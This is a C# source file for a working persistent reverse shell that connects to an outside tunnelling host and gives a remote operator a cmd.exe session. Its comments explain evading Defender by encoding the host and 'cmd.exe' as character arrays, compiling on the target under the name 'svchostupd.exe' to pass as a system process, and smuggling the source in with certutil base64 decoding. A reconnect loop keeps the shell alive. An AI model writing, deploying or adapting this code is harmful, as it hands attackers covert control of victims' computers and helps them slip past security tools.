// Simple persistent TCP reverse shell (cmd.exe over socket) that compiles
// clean on Windows PowerShell 5.1-era csc (C# 5) and passes Defender
// real-time heuristics thanks to string obfuscation. Host is built from a
// char array so the literal "bore.pub" never appears in source or binary.
//
// Compile on target:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\tmp\svchostupd.exe C:\tmp\rs.cs
//   (transfer rs.cs via chunked-base64 + certutil -decode; see SKILL.md)
//
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

class R
{
    static string D(int[] a)
    {
        char[] c = new char[a.Length];
        for (int i = 0; i < a.Length; i++) c[i] = (char)a[i];
        return new string(c);
    }

    static void Pump(Stream src, NetworkStream dst)
    {
        byte[] b = new byte[4096];
        int n;
        try { while ((n = src.Read(b, 0, 4096)) > 0) dst.Write(b, 0, n); } catch { }
    }

    static void Main()
    {
        // "bore.pub" encoded as int array — change target by recomputing chars
        string host = D(new int[] { 98, 111, 114, 101, 46, 112, 117, 98 });
        while (true)
        {
            try
            {
                TcpClient cl = new TcpClient();
                cl.Connect(host, 40000);
                Process p = new Process();
                ProcessStartInfo si = new ProcessStartInfo();
                si.FileName = D(new int[] { 99, 109, 100, 46, 101, 120, 101 }); // "cmd.exe"
                si.UseShellExecute = false;
                si.RedirectStandardInput = true;
                si.RedirectStandardOutput = true;
                si.RedirectStandardError = true;
                p.StartInfo = si;
                p.Start();
                NetworkStream ns = cl.GetStream();
                Thread t1 = new Thread(delegate() { Pump(p.StandardOutput.BaseStream, ns); });
                Thread t2 = new Thread(delegate() { Pump(p.StandardError.BaseStream, ns); });
                t1.Start(); t2.Start();
                byte[] ib = new byte[4096];
                int r;
                while ((r = ns.Read(ib, 0, 4096)) > 0)
                {
                    string cmd = Encoding.UTF8.GetString(ib, 0, r).TrimEnd(new char[] { '\r', '\n' });
                    if (cmd.Length > 0) { p.StandardInput.WriteLine(cmd); p.StandardInput.Flush(); }
                }
            }
            catch { }
            Thread.Sleep(5000); // reconnect loop: survives tunnel drops
        }
    }
}
